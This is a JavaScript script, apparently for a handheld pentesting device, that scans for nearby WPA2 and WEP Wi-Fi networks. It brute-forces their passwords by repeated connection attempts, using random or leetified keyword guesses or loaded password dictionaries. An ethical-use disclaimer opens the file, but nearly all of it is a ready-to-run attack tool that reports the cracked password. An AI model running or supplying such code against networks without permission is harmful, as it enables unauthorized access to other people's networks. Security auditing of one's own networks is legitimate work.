// Wi-Fi Randomic or Dictionary Brute Force by DavideEDN

// WARNING !

// This tool is intended for ethical hacking and security auditing purposes only, specifically to test the security of Wi-Fi networks you own or have explicit permission to test. 
// Unauthorized access to or attempts to compromise networks without explicit permission are illegal and unethical. 
// The developer(s) are not responsible for any misuse of this software. 
// By using this tool, you agree to assume all responsibility and liability for your actions. 
// It is your responsibility to comply with all applicable laws and regulations. If you are unsure whether your activities are legal, consult with legal counsel. 
// Please, do not use this tool for any malicious or illegal purposes.

function showCenteredText() {
  dialogMessage("bf_randict by DavideEDN");
  delay(2000);
}
showCenteredText();

var network_to_attack_ssid = "";
var pwdLength = 10;
var maxAttempts = 100;
var settings = {
  caseType: "random",
  includeNumbers: true,
  includeSpecialChars: false,
  keyword: "",
  onlyNumbers: false,
  randomSide: "mixed"
};
var passwords_dicts_arr = [];

function leetifyChar(c) {
  var lower = c.toLowerCase();
  var rand = Math.random();
  if (lower === 'a') { if (rand < 0.5) return '4'; }
  else if (lower === 'e') { if (rand < 0.5) return '3'; }
  else if (lower === 'i') { if (rand < 0.5) return '1'; }
  else if (lower === 'o') { if (rand < 0.5) return '0'; }
  else if (lower === 'u') { if (rand < 0.3) return 'v'; else if (rand < 0.6) return 'µ'; }
  else if (lower === 's') { if (rand < 0.5) return rand < 0.25 ? '5' : '$'; }
  else if (lower === 't') { if (rand < 0.5) return '7'; }
  else if (lower === 'l') { if (rand < 0.5) return '1'; }
  else if (lower === 'b') { if (rand < 0.5) return '8'; }
  else if (lower === 'g') { if (rand < 0.3) return '9'; }
  else if (lower === 'z') { if (rand < 0.3) return '2'; }
  return c;
}
function leetifyKeywordAuto(keyword) {
  var result = "";
  for (var i = 0; i < keyword.length; i++) result += leetifyChar(keyword.charAt(i));
  return result;
}
function applyCaseType(str, caseType) {
  if (caseType === "random") return str;
  if (caseType === "firstUpper") return str.charAt(0).toUpperCase() + str.slice(1);
  if (caseType === "upper") return str.toUpperCase();
  if (caseType === "lower") return str.toLowerCase();
  return str;
}
function generateRandomString(length, settings, onlyNumbersOverride) {
  var onlyNumbers = (typeof onlyNumbersOverride === "boolean") ? onlyNumbersOverride : settings.onlyNumbers;
  if (onlyNumbers) {
    var result = "";
    for (var i = 0; i < length; i++) result += "0123456789".charAt(Math.floor(Math.random() * 10));
    return result;
  }
  var lettersLower = "abcdefghijklmnopqrstuvwxyz";
  var lettersUpper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  var numbers = "0123456789";
  var specialChars = "!@#$%^&*()-_=+[]{}|;:,.<>?";
  var chars = lettersLower;
  if (settings.caseType === "random") chars += lettersUpper;
  else if (settings.caseType === "upper") chars = lettersUpper;
  else if (settings.caseType === "lower") chars = lettersLower;
  else if (settings.caseType === "firstUpper") chars += lettersUpper;
  if (settings.includeNumbers) chars += numbers;
  if (settings.includeSpecialChars) chars += specialChars;
  if (chars.length === 0) chars = lettersLower;
  var result = "";
  for (var i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  if (settings.caseType === "firstUpper" && length > 0) result = result.charAt(0).toUpperCase() + result.slice(1);
  else if (settings.caseType === "upper") result = result.toUpperCase();
  else if (settings.caseType === "lower") result = result.toLowerCase();
  return result;
}
function generatePassword(keyword, pwdLength, settings, useLeetify) {
  var kw = keyword;
  if (useLeetify) kw = leetifyKeywordAuto(keyword);
  kw = applyCaseType(kw, settings.caseType);
  var kwLength = kw.length;
  if (kwLength > pwdLength) { kw = kw.substring(0, pwdLength); kwLength = pwdLength; }
  var randomPartLength = pwdLength - kwLength;
  var randPart = "";
  if (randomPartLength > 0) {
    var onlyNumsForRandom = settings.onlyNumbers;
    randPart = generateRandomString(randomPartLength, settings, onlyNumsForRandom);
  }
  if (settings.randomSide === "left") return randPart + kw;
  else if (settings.randomSide === "right") return kw + randPart;
  else return (Math.random() < 0.5) ? kw + randPart : randPart + kw;
}
function wifiRandomAttack(ssid, pwdLength, maxAttempts, settings, useLeetify) {
  var connected = false;
  for (var attempts = 0; attempts < maxAttempts; attempts++) {
    var pwd;
    if (settings.keyword && settings.keyword.length > 0 && settings.keyword.length <= pwdLength) {
      pwd = generatePassword(settings.keyword, pwdLength, settings, useLeetify);
    } else {
      pwd = generateRandomString(pwdLength, settings);
    }
    serialPrintln("Trying pwd for " + ssid + ": " + pwd);
    dialogMessage("Trying pwd: " + pwd + " (" + (attempts + 1) + "/" + maxAttempts + ")");
    connected = wifiConnect(ssid, 1, pwd);
    if (connected) {
      serialPrintln("Pwd found for " + ssid + ": " + pwd);
      dialogMessage("Pwd found: " + pwd, true);
      return;
    }
  }
  dialogError("Pwd not found after " + maxAttempts + " attempts", true);
}
function keyboard(defaultValue, maxLength, promptText) {
  dialogMessage(promptText + "\n(Keyboard Emulation)");
  var input = "";
  while (true) {
    var options = [
      "a", "a", "b", "b", "c", "c", "d", "d", "e", "e", "f", "f",
      "g", "g", "h", "h", "i", "i", "j", "j", "k", "k", "l", "l",
      "m", "m", "n", "n", "o", "o", "p", "p", "q", "q", "r", "r",
      "s", "s", "t", "t", "u", "u", "v", "v", "w", "w", "x", "x",
      "y", "y", "z", "z", "0", "0", "1", "1", "2", "2", "3", "3",
      "4", "4", "5", "5", "6", "6", "7", "7", "8", "8", "9", "9",
      "DEL", "DEL", "OK", "OK"
    ];
    var choice = dialogChoice(options);
    if (choice === "" || choice === null) break;
    if (choice === "DEL") input = input.slice(0, -1);
    else if (choice === "OK") break;
    else {
      input += choice;
      if (input.length >= maxLength) break;
    }
    dialogMessage(promptText + "\n" + input);
  }
  return input;
}
function showKeyword() {
  var text = settings.keyword === "" ? "(none)" : settings.keyword;
  var totalWidth = 20;
  var leftPad = Math.floor((totalWidth - text.length) / 2);
  var rightPad = totalWidth - text.length - leftPad;
  var centered = " ".repeat(leftPad) + text + " ".repeat(rightPad);
  dialogMessage("Current Keyword:\n" + centered);
  delay(2000);
}
function setMaxAttempts() {
  var attemptsOptions = [
    "10", "10", "25", "25", "50", "50", "100", "100",
    "250", "250", "500", "500", "750", "750", "1000", "1000"
  ];
  var choice = dialogChoice(attemptsOptions);
  if (choice !== "") {
    maxAttempts = parseInt(choice);
    dialogMessage("Max attempts set to: " + maxAttempts);
  }
}
function settingsMenu() {
  while (true) {
    var settingsOptions = [
      "Set case type", "case",
      "Include numbers", "numbers",
      "Include special chars", "special",
      "Only numbers", "onlyNumbers",
      "Random chars position", "randomSide",
      "Set keyword", "keyword",
      "Show keyword", "showKeyword",
      "Set max attempts", "maxAttempts"
    ];
    var choice = dialogChoice(settingsOptions);
    if (choice === "" || choice === "back") return;
    if (choice === "case") {
      var caseTypeLabels = [
        "Random case (mixed)", "random",
        "First letter uppercase", "firstUpper",
        "All uppercase", "upper",
        "All lowercase", "lower"
      ];
      var caseChoice = dialogChoice(caseTypeLabels);
      if (caseChoice !== "") {
        settings.caseType = caseChoice;
        dialogMessage("Case type set to: " + caseChoice);
      }
    }
    else if (choice === "numbers") {
      var includeNumbersChoice = dialogChoice(["Yes", "yes", "No", "no"]);
      if (includeNumbersChoice !== "") {
        settings.includeNumbers = (includeNumbersChoice === "yes");
        dialogMessage("Include numbers: " + (settings.includeNumbers ? "Yes" : "No"));
      }
    }
    else if (choice === "special") {
      var includeSpecialChoice = dialogChoice(["Yes", "yes", "No", "no"]);
      if (includeSpecialChoice !== "") {
        settings.includeSpecialChars = (includeSpecialChoice === "yes");
        dialogMessage("Include special chars: " + (settings.includeSpecialChars ? "Yes" : "No"));
      }
    }
    else if (choice === "onlyNumbers") {
      var onlyNumbersChoice = dialogChoice(["Yes", "yes", "No", "no"]);
      if (onlyNumbersChoice !== "") {
        settings.onlyNumbers = (onlyNumbersChoice === "yes");
        dialogMessage("Only numbers: " + (settings.onlyNumbers ? "Yes" : "No"));
        if (settings.onlyNumbers) {
          settings.includeNumbers = true;
          settings.includeSpecialChars = false;
          settings.caseType = "lower";
        }
      }
    }
    else if (choice === "randomSide") {
      var sideChoice = dialogChoice([
        "Left side only", "left",
        "Right side only", "right",
        "Mixed (random)", "mixed"
      ]);
      if (sideChoice !== "") {
        settings.randomSide = sideChoice;
        dialogMessage("Random chars position set to: " + sideChoice);
      }
    }
    else if (choice === "keyword") {
      var input = keyboard(settings.keyword, 63, "Enter keyword:");
      if (input !== null) {
        settings.keyword = input;
        dialogMessage("Keyword set to: " + (settings.keyword === "" ? "(none)" : settings.keyword));
      }
    }
    else if (choice === "showKeyword") {
      showKeyword();
    }
    else if (choice === "maxAttempts") {
      setMaxAttempts();
    }
  }
}
function wifiDictAttack(ssid, pwds) {
  var connected = false;
  for (var i = 0; i < pwds.length; i++) {
    if (!pwds[i].trim()) continue;
    serialPrintln("Trying password for " + ssid + ": " + pwds[i]);
    dialogMessage("Trying pwd " + (i + 1) + "/" + pwds.length);
    connected = wifiConnect(ssid, 3, pwds[i]);
    if (connected) {
      serialPrintln("Password found for " + ssid + ": " + pwds[i]);
      dialogMessage("Pwd found: " + pwds[i], true);
      return true;
    }
  }
  dialogError("Pwd not found", false);
  return false;
}

while (true) {
  var mainMenuOptions = [
    "bf_random", "bf_random",
    "bf_dict", "bf_dict",
    "About", "about"
  ];
  var mainChoice = dialogChoice(mainMenuOptions);
  if (mainChoice === "") break;

  if (mainChoice === "bf_random") {
    while (true) {
      var menuOptions = [
        "Select AP", "scan",
        "Set pwd length", "setlength",
        "Settings", "settings",
        "Start attack", "attack"
      ];
      var choice = dialogChoice(menuOptions);
      if (choice === "" || choice === "back") break;
      if (choice === "scan") {
        dialogMessage("Scanning...");
        var networks = wifiScan();
        if (!networks.length) {
          dialogError("No wifi networks found!");
          continue;
        }
        var networks_choices = [];
        for (var i = 0; i < networks.length; i++) {
          if (networks[i].encryptionType === "WPA2_PSK" || networks[i].encryptionType === "WEP") {
            networks_choices.push(networks[i].SSID, networks[i].SSID);
          }
        }
        if (networks_choices.length === 0) {
          dialogError("No WPA2 or WEP networks found!");
          continue;
        }
        network_to_attack_ssid = dialogChoice(networks_choices);
      }
      else if (choice === "setlength") {
        var length_choices = [];
        for (var l = 5; l <= 20; l++) length_choices.push(l.toString(), l.toString());
        var selectedLength = dialogChoice(length_choices);
        if (selectedLength === "") {
          dialogError("No length selected");
          continue;
        }
        pwdLength = parseInt(selectedLength);
        dialogMessage("Pwd length set to " + pwdLength);
      }
      else if (choice === "settings") {
        settingsMenu();
      }
      else if (choice === "attack") {
        if (!network_to_attack_ssid) {
          dialogError("No wifi network selected");
          continue;
        }
        var leetifyChoice = dialogChoice([
          "Use leetify", "yes",
          "No leetify", "no"
        ]);
        if (leetifyChoice === "") continue;
        var useLeetify = (leetifyChoice === "yes");
        dialogMessage("Attacking with pwd length " + pwdLength + "...");
        wifiRandomAttack(network_to_attack_ssid, pwdLength, maxAttempts, settings, useLeetify);
        wifiDisconnect();
      }
      fillScreen(0);
    }
  }
  else if (mainChoice === "bf_dict") {
    while (true) {
      var dictMenu = [
        "Select AP", "scan",
        "Add dict", "adddict",
        "Clear dicts", "cleardicts",
        "Start attack", "attack"
      ];
      var dictChoice = dialogChoice(dictMenu);
      if (dictChoice === "" || dictChoice === "back") break;
      if (dictChoice === "scan") {
        dialogMessage("Scanning..");
        var networks = wifiScan();
        if (!networks.length) {
          dialogError("No wifi networks found!");
          continue;
        }
        var networks_choices = [];
        for (var i = 0; i < networks.length; i++) {
          if (networks[i].encryptionType == "WPA2_PSK" || networks[i].encryptionType == "WEP") {
            networks_choices.push(networks[i].SSID, networks[i].SSID);
          }
        }
        network_to_attack_ssid = dialogChoice(networks_choices);
      }
      else if (dictChoice === "adddict") {
        var file = dialogPickFile("/");
        if (!file) continue;
        var content = storageRead(file);
        if (!content) {
          dialogError("Failed to read file: " + file);
          continue;
        }
        var raw_passwords = content.split("\n");
        var pwd_arr = [];
        for (var i = 0; i < raw_passwords.length; i++) {
          var pwd = raw_passwords[i].replace(/\r/g, '').trim();
          if (pwd) pwd_arr.push(pwd);
        }
        if (pwd_arr.length > 0) {
          passwords_dicts_arr.push({ filename: file, passwords: pwd_arr });
          dialogMessage("Added dict: " + file + " (total: " + passwords_dicts_arr.length + ")", true);
        }
      }
      else if (dictChoice === "cleardicts") {
        passwords_dicts_arr = [];
        dialogMessage("Cleared all loaded dictionaries", true);
      }
      else if (dictChoice === "attack") {
        if (!network_to_attack_ssid) {
          dialogError("No wifi network selected, please rescan");
          continue;
        }
        if (passwords_dicts_arr.length == 0) {
          dialogError("No password dictionaries loaded");
          continue;
        }
        dialogMessage("Attacking...");
        var found = false;
        for (var d = 0; d < passwords_dicts_arr.length; d++) {
          var dict = passwords_dicts_arr[d];
          dialogMessage("Attacking with dict " + (d + 1) + "/" + passwords_dicts_arr.length + ": " + dict.filename);
          found = wifiDictAttack(network_to_attack_ssid, dict.passwords);
          if (found) break;
        }
        if (!found) dialogError("Password not found in any dictionary", true);
        wifiDisconnect();
      }
      fillScreen(0);
    }
  }
  else if (mainChoice === "about") {
    dialogMessage("github.com/davideednm5", true);
  }
  fillScreen(0);
}
